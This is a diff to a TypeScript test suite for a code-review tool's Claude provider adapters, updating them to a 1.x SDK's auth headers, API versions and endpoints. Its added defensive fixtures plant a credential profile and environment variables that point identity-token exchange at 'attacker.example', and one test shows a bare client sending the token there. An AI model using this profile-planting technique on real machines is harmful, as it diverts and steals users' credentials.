@@ -7,8 +7,11 @@ import {
   type ProviderCompletionCall,
   type ProviderCompletionResult,
 } from "@rocky-reviews/core";
-import { AnthropicError } from "@anthropic-ai/sdk";
-import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
+import Anthropic, { AnthropicError } from "@anthropic-ai/sdk";
+import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
 import { LlmConfigError, type ProviderSettings } from "../config.js";
 import { envSecrets } from "../registry.js";
 import { toCallError } from "./claude.js";
@@ -64,11 +67,13 @@ const PLATFORMS: readonly Platform[] = [
   {
     kind: "anthropic",
     settings: { kind: "anthropic", apiKeyEnv: "ROCKY_TEST_ANTHROPIC_KEY" },
-    url: () => "https://api.anthropic.com/v1/messages?beta=true",
+    url: () => "https://api.anthropic.com/v1/messages",
     bodyModel: (model) => model,
     checkAuth: (request) => {
-      expect(request.headers["x-api-key"]).toBe(TEST_KEY);
-      expect(request.headers["authorization"]).toBeUndefined();
+      // The 1.x SDK sends the key as a bearer token (API version 2026-10-21): Rocky's key, not
+      // the ambient ANTHROPIC_AUTH_TOKEN, and nothing in the previous `x-api-key` form.
+      expect(request.headers["authorization"]).toBe(`Bearer ${TEST_KEY}`);
+      expect(request.headers["x-api-key"]).toBeUndefined();
       expect(request.headers["anthropic-beta"]).toBe("server-side-fallback-2026-07-01");
     },
     fallbacks: true,
@@ -77,7 +82,7 @@ const PLATFORMS: readonly Platform[] = [
   {
     kind: "bedrock",
     settings: { kind: "bedrock", region: "us-east-1" },
-    url: () => "https://bedrock-mantle.us-east-1.api.aws/anthropic/v1/messages?beta=true",
+    url: () => "https://bedrock-mantle.us-east-1.api.aws/anthropic/v1/messages",
     bodyModel: (model) => `anthropic.${model}`,
     checkAuth: (request) => {
       expect(request.headers["authorization"]).toMatch(
@@ -98,7 +103,9 @@ const PLATFORMS: readonly Platform[] = [
     checkAuth: (request) => {
       expect(request.headers["authorization"]).toBe("Bearer vertex-test-token");
       expect(request.headers["x-api-key"]).toBeUndefined();
-      expect(request.body["anthropic_version"]).toBe("vertex-2023-10-16");
+      // Vertex takes the API version in the body; the 1.x client copies the SDK's there.
+      expect(request.headers["anthropic-version"]).toBeUndefined();
+      expect(request.body["anthropic_version"]).toBe("2026-10-21");
     },
     fallbacks: false,
     keyed: false,
@@ -106,7 +113,7 @@ const PLATFORMS: readonly Platform[] = [
   {
     kind: "foundry",
     settings: { kind: "foundry", resource: "acme-foundry", apiKeyEnv: "ROCKY_TEST_FOUNDRY_KEY" },
-    url: () => "https://acme-foundry.services.ai.azure.com/anthropic/v1/messages?beta=true",
+    url: () => "https://acme-foundry.services.ai.azure.com/anthropic/v1/messages",
     bodyModel: (model) => model,
     checkAuth: (request) => {
       expect(request.headers["x-api-key"]).toBe(TEST_KEY);
@@ -116,6 +123,38 @@ const PLATFORMS: readonly Platform[] = [
     keyed: true,
   },
 ];
+
+/** The API version the 1.x SDKs send; Bedrock serves its pre-4.7 models on the previous one. */
+const API_VERSION = "2026-10-21";
+const PREVIOUS_API_VERSION = "2023-06-01";
+
+/**
+ * A profile planted where the 1.x SDK's credential chain looks (`ANTHROPIC_PROFILE` +
+ * `ANTHROPIC_CONFIG_DIR`): workload-identity federation with its own base URL, so a client that
+ * consulted it would exchange the identity token at the attacker's host and carry the result.
+ * Built at runtime so no scanner sees a token-shaped literal.
+ */
+const PLANTED_IDENTITY_TOKEN = ["planted", "identity", "token"].join("-");
+const PLANTED_BASE_URL = "https://attacker.example/profile";
+let plantedConfigDir = "";
+
+beforeAll(() => {
+  plantedConfigDir = mkdtempSync(join(tmpdir(), "rocky-llm-planted-profile-"));
+  mkdirSync(join(plantedConfigDir, "configs"));
+  writeFileSync(join(plantedConfigDir, "active_config"), "attacker\n");
+  writeFileSync(
+    join(plantedConfigDir, "configs", "attacker.json"),
+    JSON.stringify({
+      version: "1.0",
+      organization_id: "org_planted",
+      base_url: PLANTED_BASE_URL,
+      authentication: { type: "oidc_federation", federation_rule_id: "fr_planted" },
+    }),
+  );
+});
+afterAll(() => {
+  rmSync(plantedConfigDir, { recursive: true, force: true });
+});
 
 const SECRETS = { ROCKY_TEST_ANTHROPIC_KEY: TEST_KEY, ROCKY_TEST_FOUNDRY_KEY: TEST_KEY };
 
@@ -193,6 +232,18 @@ beforeEach(() => {
   vi.stubEnv("ANTHROPIC_BEDROCK_MANTLE_BASE_URL", "https://attacker.example/bedrock");
   vi.stubEnv("AWS_BEARER_TOKEN_BEDROCK", "");
   vi.stubEnv("ANTHROPIC_LOG", "debug");
+  // The 1.x credential chain: a planted profile, and the workload-identity variables that alone
+  // would synthesise one (T2, T3). Neither may be consulted: the adapters pass the credential.
+  vi.stubEnv("ANTHROPIC_PROFILE", "attacker");
+  vi.stubEnv("ANTHROPIC_CONFIG_DIR", plantedConfigDir);
+  vi.stubEnv("ANTHROPIC_FEDERATION_RULE_ID", "fr_planted");
+  vi.stubEnv("ANTHROPIC_ORGANIZATION_ID", "org_planted");
+  vi.stubEnv("ANTHROPIC_SERVICE_ACCOUNT_ID", "sa_planted");
+  vi.stubEnv("ANTHROPIC_WORKSPACE_ID", "wrkspc_planted");
+  vi.stubEnv("ANTHROPIC_IDENTITY_TOKEN", PLANTED_IDENTITY_TOKEN);
+  vi.stubEnv("ANTHROPIC_WEBHOOK_SIGNING_KEY", OTHER_KEY);
+  vi.stubEnv("ANTHROPIC_OPEN_TELEMETRY", "true");
+  vi.stubEnv("ANTHROPIC_OPEN_TELEMETRY_TRACES_CONTENT_MODE", "content");
 });
 afterEach(() => {
   vi.unstubAllEnvs();
@@ -247,6 +298,33 @@ describe.each(PLATFORMS)("Claude contract: $kind", (platform) => {
     }
     if (platform.fallbacks) expect(body["fallbacks"]).toBe("default");
     else expect(body["fallbacks"]).toBeUndefined();
+    // Nothing from the planted profile or the workload-identity variables reached the wire.
+    expect(JSON.stringify([request!.url, request!.headers, body])).not.toContain("planted");
+  });
+
+  it("sends API version 2026-10-21, except Bedrock's pre-4.7 model on 2023-06-01 (1.x SDKs)", async () => {
+    const cases: [string, string][] = [
+      ["claude-opus-5-5", API_VERSION],
+      ["claude-haiku-5-5", API_VERSION],
+      ["claude-haiku-4-5", platform.kind === "bedrock" ? PREVIOUS_API_VERSION : API_VERSION],
+    ];
+    for (const [model, expected] of cases) {
+      const { provider, requests } = providerFor(platform, [sse("end-turn.sse")]);
+      expect((await complete(provider, { model, effort: undefined })).status).toBe("ok");
+      const request = requests[0]!;
+      if (platform.kind === "vertex") {
+        expect(request.headers["anthropic-version"], model).toBeUndefined();
+        expect(request.body["anthropic_version"], model).toBe(expected);
+      } else {
+        expect(request.headers["anthropic-version"], model).toBe(expected);
+      }
+      if (platform.kind === "bedrock") {
+        // The version header is part of what SigV4 signed, so the override is not a forgery.
+        expect(request.headers["authorization"], model).toMatch(
+          /SignedHeaders=[^,]*\banthropic-version\b/,
+        );
+      }
+    }
   });
 
   it("a prompt-mode output sends its schema after the instructions, in the cached block, and no enforced format (H4-4)", async () => {
@@ -830,9 +908,40 @@ describe("Claude platform details", () => {
     const { provider, requests } = providerFor(gateway, [sse("end-turn.sse")]);
     await complete(provider);
     expect(requests[0]!.url.toString()).toBe(
-      "https://llm-gateway.acme.example/anthropic/v1/messages?beta=true",
+      "https://llm-gateway.acme.example/anthropic/v1/messages",
     );
-    expect(requests[0]!.headers["x-api-key"]).toBe(TEST_KEY);
+    expect(requests[0]!.headers["authorization"]).toBe(`Bearer ${TEST_KEY}`);
+    expect(requests[0]!.headers["x-api-key"]).toBeUndefined();
+  });
+
+  it("the planted profile is live: a bare SDK client that consults it exchanges the identity token at the attacker's host (T2)", async () => {
+    // Proves the chain the contract tests plant has teeth, so "one request to the configured
+    // host" above is not vacuous: this client is given no key, only the profile.
+    const fake = fakeFetch(json("claude/errors/401-authentication.json", 401));
+    const client = new Anthropic({
+      profile: "attacker",
+      fetch: fake.fetch,
+      maxRetries: 0,
+      logLevel: "off",
+      logger: {
+        error: () => undefined,
+        warn: () => undefined,
+        info: () => undefined,
+        debug: () => undefined,
+      },
+    });
+    await client.beta.messages
+      .stream({
+        model: "claude-opus-5-5",
+        max_tokens: 1,
+        messages: [{ role: "user", content: "x" }],
+      })
+      .finalMessage()
+      .catch(() => undefined);
+    expect(fake.requests.length).toBeGreaterThan(0);
+    expect(fake.requests[0]!.url.toString()).toBe(`${PLANTED_BASE_URL}/v1/oauth/token`);
+    expect(fake.requests[0]!.body["assertion"]).toBe(PLANTED_IDENTITY_TOKEN);
+    expect(fake.requests[0]!.body["federation_rule_id"]).toBe("fr_planted");
   });
 
   it("reads the key at every call and never at construction", async () => {
